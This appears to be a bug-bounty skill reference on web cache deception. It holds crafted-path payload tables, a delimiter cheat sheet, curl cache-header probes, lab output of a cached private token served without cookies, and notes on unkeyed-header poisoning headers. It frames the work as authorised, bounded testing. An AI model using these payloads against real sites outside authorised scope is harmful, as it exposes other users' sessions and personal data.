# Web cache deception — a private page stored in a public cache entry

> **This file is the single owner of web cache DECEPTION for the pack.** Other skills keep a
> recognition line and point here. The sibling class — unkeyed-header cache **poisoning**, where
> the attacker controls the *content* rather than reading the victim's — is recognized at the end
> of this file and its denial variant is owned by
> `../../resource-abuse/references/cache-poisoning-denial.md`.

The edge decides **"is this cacheable?"** from the URL suffix. The origin decides **"which route
is this?"** after normalizing that suffix away. Two parsers, one URL, different answers — so a
`Cache-Control: private` account page gets stored under a key that anyone can request.

## Contents

- The disagreement (both halves must hold)
- Recognize the surface
- The payload family — what each one exploits
- Delimiter-discrepancy cheat sheet
- The oracle — headers, not vibes (executed output)
- The four-cell truth table
- Safe proof — rung 2, and only rung 2
- Escalation — what makes it High
- Sibling class: unkeyed-header cache POISONING (recognition only)
- Sibling class: cross-tenant cache KEY CONFUSION (owned here)
- Converts?
- Evidence checklist

---

## The disagreement (both halves must hold)

1. **The edge stores it.** A CDN rule caches on the path suffix (`*.css`, `*.js`, `*.png`) or a
   blanket "cache everything" rule, and **the cookie is not in the cache key** (no `Vary: Cookie`).
2. **The origin still serves the private page.** The crafted suffix is normalized away before
   route matching — stripped as a trailing segment, a format suffix, or truncated at a delimiter —
   so the session cookie is honoured and the authenticated body is rendered.

Only (1) → you created a cache entry holding a public 404. That is **not a finding**, and it is the
most common false positive in this class. Only (2) → the private body was served but never stored;
rotate the suffix. You must show **both**, and the second half is shown by an anonymous fetch
returning the private body.

`Cache-Control: private, no-store` on the response does **not** mean safe: an extension rule at the
edge overrides the origin's directive. Verified in the lab below — the origin sent
`Cache-Control: private, no-store`, the edge stored and replayed the body anyway. Judge from
`X-Cache`/`Age` on the second fetch, never from `Cache-Control` on the first.

## Recognize the surface

- **The page**: any authenticated view rendered server-side with identity in it — `/account`,
  `/settings`, `/profile`, `/billing`, `/orders/{id}`, `/api/me`, `/graphql` GETs, and SSR data
  routes like `/_next/data/<buildId>/account.json` (already `.json`-suffixed, so the default
  static rule may already key it — check `x-vercel-cache`).
- **API over HTML.** JSON responses carry the bearer/CSRF token and the raw PII; HTML often
  carries only rendered text. Aim the payloads at `/api/...` first.
- **The edge exists at all**: any of `cf-cache-status`, `x-cache`, `x-cache-hits`, `x-served-by`,
  `age`, `x-amz-cf-id`, `x-vercel-cache`, `x-akamai-*` on any response from the app host.
- **The static rule is live**: request a nonce path that cannot exist, ending in `.css`, and see
  whether the edge caches even the 404. If a 404 gets a cache entry, the rule keys on the suffix,
  not on the origin's response — that is exactly the rule cache deception rides.
- **`Vary: Cookie` present on the target page = this path is not deceivable.** The cookie is in
  the key, every session gets its own entry. Rotate to a path where `Vary` is absent.

## The payload family — what each one exploits

Against a nonce so the entry is yours alone: `/account/d0x-$RANDOM.css`, not `/account/foo.css`.

| Payload | The disagreement it exploits | Lands when the origin… |
|---|---|---|
| `/account/foo.css` | edge sees a static file in a directory; origin sees a prefix route with an extra segment | strips a trailing `/<segment>.<ext>`, or prefix-matches `/account` with a mounted sub-router (Express, Rails, Django tolerant trailing segments) |
| `/account.css` | bare extension on the route itself | strips a known static extension, or does format/content negotiation on the suffix (Rails `.:format`, Spring suffix-pattern matching) |
| `/account;.css`, `/account;foo.css` | `;` is an RFC 3986 **path-parameter** delimiter to the origin and an ordinary path character to the edge | truncates at `;` (Tomcat/Spring `;jsessionid` handling, several Go routers) |
| `/account%3Bfoo.css` | percent-encoded `;` — beats an edge that normalizes the literal `;` but not `%3B`, and a WAF matching the literal | decodes before truncating |
| `/account%23.css` | encoded `#` — the origin decodes then truncates at the fragment delimiter; the edge never decodes, so the key keeps `.css` | decodes then splits on `#` |
| `/account%00.css` | encoded NUL against C-string-backed path handling | truncates at the NUL |
| `/account/%0Afoo.js` | encoded LF — truncation *or* segment-strip, whichever the origin does | either profile (see lab result: the only payload that landed under **both**) |
| `/account.css/` | trailing slash after the extension — edges that strip the slash before extension matching disagree with origins that keep it | keeps or strips the slash opposite to the edge |
| `/account/foo.js/bar.css` | double static segment for origins that strip exactly one trailing segment, and edges that match the first extension found | strips exactly one segment |
| `/account/.css` | dot-file segment: an extension with an empty basename | strips a trailing `/<anything>.<ext>` including the empty basename |
| `/account?x=.css` | query tail — fires only when the edge matches the extension against the **full URL including query** rather than the path | never normalizes; the edge does the wrong thing |
| `/account/..%2f<nonce>.css` | **reverse direction**: the *edge* decodes `%2f`, resolves the dot-segment, and keys on the resolved path; the origin does not decode and routes the raw path to `/account` | does **not** decode `%2f` (see the safety note below) |

**Double-encode every delimiter variant that fails once** (`%253B`, `%2523`, `%2500`): a two-layer
stack where the edge decodes once and the origin decodes twice flips the discrepancy back on.

**Send them with `curl --path-as-is` whenever the payload contains a literal dot-segment
(`..` or `/./`).** curl resolves dot-segments client-side, so the request never leaves the machine
in the shape you wrote — and this class lives entirely on what the *server* sees. Executed against
a local echo server (curl 8.5.0), request line as received:

```
/account/../foo.css      plain -> GOT: /foo.css              path-as-is -> GOT: /account/../foo.css
/account/./foo.css       plain -> GOT: /account/foo.css      path-as-is -> GOT: /account/./foo.css
/a/b/../../foo.css       plain -> GOT: /foo.css              path-as-is -> GOT: /a/b/../../foo.css
/account//foo.css        plain -> GOT: /account//foo.css     path-as-is -> GOT: /account//foo.css
/account/..%2ffoo.css    plain -> GOT: /account/..%2ffoo.css path-as-is -> GOT: /account/..%2ffoo.css
```

Two consequences, both load-bearing: curl **does not** collapse a duplicate slash, so `//` variants
are safe to send either way; and percent-encoded forms (`..%2f`, `%00`, `%253B`) go byte-for-byte
with or without the flag. `--path-as-is` matters **only** for literal `..` and `/./`. Without it,
`/account/../foo.css` is silently sent as `/foo.css` and you record a false negative for a payload
you never actually sent.

**The `..%2f` row is the only one with shared blast radius.** If you point it at a real asset path
(`/account/..%2fstatic/app.css`) the entry that gets poisoned is one every real user loads, and it
then serves your account JSON to them — that is denial plus self-doxxing, **rung 5 — not attempted: ask d0x directly before executing,
do not run it**. Point it at a nonce path that does not exist (`/account/..%2fd0x-8412.css`): the
discrepancy is proven identically and the key is yours.

### Lab result — the family is a profile probe, not a shotgun

Executed locally — an extension-keyed edge (caches on the raw `.css`/`.js` suffix, never decodes,
ignores the origin's `Cache-Control`) in front of one origin run under two normalization profiles.
`AUTH=YES` means the authenticated seed request got the private body back; `ANON=YES` means the
follow-up request **with zero cookies** got that same private body out of the cache; the last column
is `X-Cache` on that anonymous fetch:

```
origin profile SEG (strips a trailing "/<seg>.<ext>")   origin profile EXT (truncates at ; # NUL LF, strips ".<ext>")
/account/foo.css         AUTH=YES ANON=YES  HIT          /account/foo.css         AUTH=no  ANON=no   HIT
/account;.css            AUTH=no  ANON=no   HIT          /account;.css            AUTH=YES ANON=YES  HIT
/account%3Bfoo.css       AUTH=no  ANON=no   HIT          /account%3Bfoo.css       AUTH=YES ANON=YES  HIT
/account/%0Afoo.js       AUTH=YES ANON=YES  HIT          /account/%0Afoo.js       AUTH=no  ANON=no   HIT
/account%23.css          AUTH=no  ANON=no   HIT          /account%23.css          AUTH=YES ANON=YES  HIT
/account%00.css          AUTH=no  ANON=no   HIT          /account%00.css          AUTH=YES ANON=YES  HIT
/account.css             AUTH=no  ANON=no   HIT          /account.css             AUTH=YES ANON=YES  HIT
/account/foo.js/bar.css  AUTH=no  ANON=no   HIT          /account/foo.js/bar.css  AUTH=no  ANON=no   HIT
/accountfoo.css          AUTH=no  ANON=no   HIT          /accountfoo.css          AUTH=no  ANON=no   HIT
/account/                AUTH=YES ANON=no   uncacheable  /account/                AUTH=YES ANON=no   uncacheable
```

Three things to take from it:

1. **Every** crafted path got a cache entry (`HIT` on the second fetch) — including the ones that
   leaked nothing. A `HIT` alone proves the edge rule, never the bug.
2. Which payload lands depends entirely on the origin's normalization profile, and **no single
   payload lands under both** — `%0A` wins under SEG and dies under EXT (there it truncates to
   `/account/`, which is not `/account`), while `;`, `%23`, `%00` and the bare `.css` are the
   inverse. That is the lesson: there is no best first probe, so run the whole family before
   concluding the target is not deceivable. A one-payload negative is not a negative.
3. `/account/foo.js/bar.css` and `/accountfoo.css` landed under neither — they are the negative
   controls that prove the sweep is discriminating rather than "everything works".

## Delimiter-discrepancy cheat sheet

Send each raw, encoded, and double-encoded. The one that truncates at the origin but not at the
edge is the one that works.

| Delimiter | Raw | Encoded | Who typically truncates |
|---|---|---|---|
| path-parameter | `;` | `%3B` / `%253B` | Tomcat, Spring, some Go routers |
| fragment | `#` | `%23` / `%2523` | anything that decodes before splitting |
| NUL | — | `%00` / `%2500` | C-string path layers, older nginx/PHP |
| newline | — | `%0A`, `%0D`, `%0D%0A` | header/line-oriented parsers, segment-strippers |
| query | `?` | `%3F` | origins that decode `%3F` into a real query separator |
| path separator | `/` | `%2F` / `%252F` | the **edge** side of the `..%2f` row above |

## The oracle — headers, not vibes (executed output)

One command reads every cache header any of the major edges emit:

```bash
curl -sS -D - -o /dev/null --max-time 20 "https://<host><crafted-path>" \
  | rg -i '^(HTTP/|cf-cache-status|x-cache|x-cache-hits|x-served-by|age|cache-control|vary|x-vercel-cache|x-amz-cf-id)'
```

Run it **twice, a few seconds apart, on the same URL**. Executed against a Cloudflare-fronted host
with a nonce `.css` path — real output:

```
--- https://www.cloudflare.com/static/p1596322478;x.css
HTTP/2 404
cf-cache-status: MISS          <- first request: no entry existed
cache-control: max-age=12960000
vary: accept-encoding
HTTP/2 404
cf-cache-status: HIT           <- second request: served from the entry the first one created
age: 3                         <- seconds the entry has been stored
cache-control: max-age=12960000
```

Four facts came out of that run, all of them load-bearing:

- **A 404 got cached.** The rule keys on the `.css` suffix, not on what the origin returned — the
  exact rule cache deception rides.
- **`;` and `%3B` were keyed as two separate entries.** The same nonce sent as `p<nonce>;x.css` and
  as `p<nonce>%3Bx.css` each went MISS then HIT independently — the edge is not decoding `%3B`, so
  the encoded variant is a genuinely distinct probe, not a duplicate of the literal. Send both.
- **`Age:` climbing across repeats** is the strongest single signal: the response is being replayed
  from storage, not regenerated. Three fetches on one fresh nonce key, four seconds apart, gave
  `MISS` → `HIT age: 4` → `HIT age: 8`.
- **A seeded entry persists for its TTL.** A nonce path seeded in an earlier session still answered
  `cf-cache-status: HIT` with `age: 814` about three hours later. This is why the seeded page must
  be a throwaway account (see the hard bounds below) — you cannot assume your entry expires
  promptly.

**`vary: accept-encoding` is not protection and must not be read as such.** The precondition is
specifically the absence of `Vary: Cookie` (or `Vary: Authorization`). An edge that varies only on
encoding still serves one entry to every requester regardless of session — the run above carried
`vary: accept-encoding` and cached anyway. Only a `Vary` that names the credential kills the class.

Fastly-fronted hosts answer the same command with a two-tier `x-cache` (shield tier, then edge
tier), `x-served-by: cache-<pop>, cache-<pop>` and an `age:`. Observed on `cdn.jsdelivr.net`:

```
x-cache: HIT, HIT
x-served-by: cache-fra-etou8220040-FRA, cache-eze2230058-EZE
age: 186027
vary: Accept-Encoding
```

Either tier can read `MISS` while the other reads `HIT`, so treat `x-cache: HIT, MISS` and
`HIT, HIT` as the same signal — stored somewhere upstream. The same asset re-requested with a
random `?cd=<nonce>` returned the **identical** `age: 186027`, proving **the query string was not
in the key**. Do not assume a query nonce busts the cache; if `age` stays large across a fresh
query value, the key is path-only and your nonce must live in the **path**.

## The four-cell truth table

| Cache entry created (MISS→HIT, `Age` climbing) | Anonymous body = your private data | Verdict |
|---|---|---|
| yes | yes | **CONFIRMED cache deception** — write the lead |
| yes | no (public page / 404 / login redirect) | cache entry only. **Not a finding.** You cached a public response |
| no | yes | origin normalizes but the edge never stored it — rotate the suffix, no finding yet |
| no | no | dead payload — rotate |

Lab confirmation of the first row (edge and origin both local, private body redacted to its shape):

```
STEP 1     own session, GET /account;foo.css              -> 200  X-Cache: MISS           {"user":"d0x","email":...,"apiToken":"tok_LIVE_..."}
STEP 2     no cookies,  GET /account;foo.css              -> 200  X-Cache: HIT   Age: 2   {"user":"d0x","email":...,"apiToken":"tok_LIVE_..."}
CONTROL 1  no cookies,  GET /account                      -> 401                          {"error":"login required"}
CONTROL 2  no cookies,  GET /account;never-seeded-9931.css-> 401  X-Cache: MISS           {"error":"login required"}
```

CONTROL 2 is the one triagers ask for: an unseeded crafted path returns nothing, so the leak in
STEP 2 came from the entry STEP 1 created — not from a broken auth check on the suffix.

## Safe proof — rung 2, and only rung 2

`../../_shared/references/safe-ladder.md` **rung 2: your own authenticated page, fetched back
anonymously.** That is the whole proof. There is no rung-3 version of this technique worth having.

0. Craft the path with a **nonce you generate**: `/account/d0x-$RANDOM.css`. The entry must be one
   nothing else would ever request.
1. **Baseline** — authenticated `GET /account` with no suffix. Capture the private body and the
   cache headers (expect `BYPASS`/`DYNAMIC`/absent, `Cache-Control: private`).
2. **Seed** — authenticated `GET` the crafted path **with your own session**. Expect `200`, your
   private body, `X-Cache: MISS` / `cf-cache-status: MISS`.
3. **Harvest** — wait a few seconds, then `GET the same URL from a clean context`: a fresh `curl`
   with no `-b`, no cookie jar, no `Cookie` header (ideally a different browser profile or host).
   Expect `HIT`, an `Age`, and **your own private body**.
4. **Negative control** — clean-context `GET /account` uncrafted → login/401. Proves the leak came
   from the cache entry, not from a broken auth check on the page itself.
5. **Second negative control** — clean-context `GET /account/d0x-never-visited-$RANDOM.css`, a
   crafted path you never seeded → login/401/404, not private data. Proves the **cache** is the
   store, not the path.
6. Stop. One page, one account, five requests.

**Hard bounds — these are what keep the technique inside rung 2:**

- **Only ever your own authenticated page.** Never fetch a crafted URL hoping a real user already
  populated it, and never sweep for pre-existing entries. That is harvesting other users' data —
  rung 3 on prod, correctly blocked, correctly penalized.
- **Never craft a path that resolves to a shared asset** (`/static/app.css`, `/`, the login page) —
  see the `..%2f` note. Shared-path poisoning is rung 5 — not attempted: ask d0x directly before executing.
- **Do not send the crafted URL to anyone.** The proof does not need a victim; your own page coming
  back with no cookies is complete.
- **Assume you CANNOT purge what you seeded, and choose the seed account accordingly.** The usual
  advice — re-request with `-H 'Cache-Control: no-cache' -H 'Pragma: no-cache'` — was executed
  against a live Cloudflare entry and **did not evict it**: the purge attempt itself answered
  `cf-cache-status: HIT age: 3`, and the next fetch answered `HIT age: 5`, i.e. the same entry, still
  counting up. Send it anyway (some edges do revalidate), but treat it as best-effort and **name the
  exact cache key in the report so the program can purge it server-side**. This is precisely why the
  page you seed must be a throwaway test account carrying no real PII: the entry outlives your
  session and you have no reliable way to take it back.
- If the program restricts privacy testing to UAT/OAT, do the seed-and-harvest there and state the
  prod-equivalent impact by inference (`../../_shared/references/safe-ladder.md` rung 4).

## Escalation — what makes it High

Read the cached body and name what a stranger now holds. The severity is decided by that, not by
the cleverness of the suffix:

- **session identifier / bearer / refresh token in the body → account takeover reach**, the top of
  this class;
- **API key, CSRF token + a state-changing endpoint that accepts it** → chain it and say so;
- **PII**: email, phone, address, order/billing detail, internal ids;
- **reach**: the same suffix against `/api/me`, the SSR data route, and each tenant-scoped page.
  One working suffix usually works across the whole route family — prove it on the highest-value
  page and state the family by inference (rung 3: one representative object, not all of them).

If the cached page carries a **tenant**-scoped object, the finding sits on this skill's own
boundary — cross-reference `tenant-vectors.md` §1 and file it as the cross-tenant read it is.

## Sibling class: unkeyed-header cache POISONING (recognition only — not owned here)

Different bug, opposite direction. Deception: the **victim's own data** lands in a public entry and
the attacker reads it. Poisoning: **attacker-controlled input** lands in a shared entry and real
users receive it.

Recognize it when a header that is **not in the cache key** changes the response body:
`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`,
`X-Forwarded-Prefix` reflected into an absolute URL, a `Location`, or a script `src` in a cacheable
response. The oracle is the same header battery above plus a body diff; the exploitation is not.

The **denial variant** — a poisoned entry making a page, asset, widget, or CDN resource serve an
error, the wrong object, or nothing — is owned by
`../../resource-abuse/references/cache-poisoning-denial.md`. Do not rebuild it here. Note that any
poisoning proof touches an entry real users share, so it is **rung 5 — not attempted: ask d0x directly before executing** unless it is
confined to a nonce path.

## Sibling class: cross-tenant cache KEY CONFUSION (owned here — it is a tenant boundary)

Deception needs you to craft a URL the two tiers disagree about. This one needs
**nothing**: the request is the ordinary one, unmodified. The cache key is the path
plus the object id and **the authenticated identity is not part of it**, so an
entry populated by the object's owner is served to a different *authenticated*
tenant asking for the same id.

Both parties are logged in and the server does not confuse the sessions — the
identity fields in the two responses differ. The **body** is the same, and the body
is the private data.

### The oracle is a state machine, and the transition is the whole proof

Run it in this order with two accounts you own. Each step is a plain `GET`:

| # | Who | Expect | What it proves |
|---|---|---|---|
| 1 | A (not the owner), cold | `404` / `403` | authorization **exists** — this is not a missing check |
| 2 | B (the owner) | `200` + B's data | the entry is populated |
| 3 | A, immediately | `200` + **B's data** | the key omits identity |
| 4 | A, after the TTL | back to `404` | it was the cache, not a permission change |

**Step 4 is what separates this from a plain authorization bug**, and step 1 is what
separates it from "shared data". Skipping either leaves a report a triager can
close two different ways.

**Corroborate the body, do not eyeball it.** Hash both responses and quote the
prefix — `sha256sum` on the two saved bodies, identical byte length. "It looked the
same" is not evidence that A received B's object rather than a coincidentally
similar one.

**Find the enforcing sibling.** In the corpus case a neighbouring endpoint on the
same resource rejected the identical cross-tenant request on *every* attempt,
cached or not. "Sibling X refuses this caller always; the vulnerable Y refuses it
only when cold" is the strongest line the report can carry.

### The objection to pre-empt

The first triage reflex is *"the identifier is secret, so possession implies
authorization."* Kill it in the report by naming where the id is publicly visible —
a listing URL, a public catalogue page, a shared link, its documented format. If
the id is genuinely unguessable, say so and grade it down yourself; if it is not,
the argument is closed before it starts.

### Rung and severity

Entirely **rung 2** — two accounts you own, read-only, and you are reading your own
second account's data. There is no destructive variant to withhold.

**Converts: Low to Medium**, and be honest about why: the window is bounded by the
cache TTL and requires the owner to have just made the request, so it is
opportunistic rather than on-demand. State the measured TTL. It rises when the
cached object carries regulated or commercially sensitive data, or when the entry
can be *forced* — if any attacker-reachable action makes the owner's request happen
(a notification, a webhook, a shared view), the timing constraint disappears and it
is a straight cross-tenant read.

**Corpus case:** `3860768` — `h1/reports/3860768-mercadolibre-elite-triaged.md`
(low · triaged; the 404 → owner 200 → 404 state machine is written out there).

## Converts?

- **High** — an anonymous, cookie-less request returns an authenticated page containing PII, order
  or billing detail, a session identifier, or an API token. Anchor on the High row "IDOR exposing
  PII" in `../../validation/references/severity-anchors.md`; if a session/bearer token is in the
  body and authenticates, re-anchor on account takeover.
- **Medium** — the cached page carries only personalization: display name, avatar URL, locale,
  feature flags, a CSRF token with no state-changing endpoint proven behind it.
- **Low / informative — this is what gets it closed**, in order of how often it happens:
  1. **A cache entry was proven but the body was public.** `X-Cache: HIT` on a crafted path that
     the origin routed to a 404 or the login page is the edge rule doing its job. It is not a bug.
     This is the single most common way this class is reported and rejected.
  2. `Vary: Cookie` is honoured on the target path — every session keys separately, no third party
     can ever be served your entry.
  3. The program argues no real user could be induced to request the crafted URL. Pre-empt it:
     show the crafted path is reachable from an ordinary link, redirect, or user-supplied URL on
     the site, and that the entry is served to *any* requester of that key.
  4. Only the browser's own cache was involved (no `Age`, no `X-Cache`, entry not reproducible
     from a second machine). That is a `Cache-Control` header observation, and a bare header
     observation is `../../validation/references/auto-discard.md` row 2.

## Evidence checklist

Write to `targets/<program>/leads/` in the format in `templates/lead.md`
(`../../_shared/references/output-contract.md` explains the funnel around it),
**Group:** `logic-misconfig`:

1. The **crafted path** with its nonce, and which normalization profile it implies.
2. **Seed request** — authenticated, full request line + `X-Cache: MISS`, private body redacted to
   its field names.
3. **Harvest request** — the same URL, **zero cookies**, showing `HIT`, `Age: N`, and the same
   private body. State plainly that no cookie was sent.
4. **`Age` climbing** across a third fetch — the replay-from-storage proof.
5. **Both negative controls** — uncrafted path anonymously (login/401), and an unseeded crafted
   path anonymously (no private data).
6. The **response headers of the uncrafted page** showing `Cache-Control: private` and no
   `Vary: Cookie` — this is what makes the origin's intent explicit and the edge's behaviour wrong.
7. **What was in the body**, named: token / PII field / billing detail. This is the severity.
8. The **cache key to purge**, so the program can evict what you seeded.
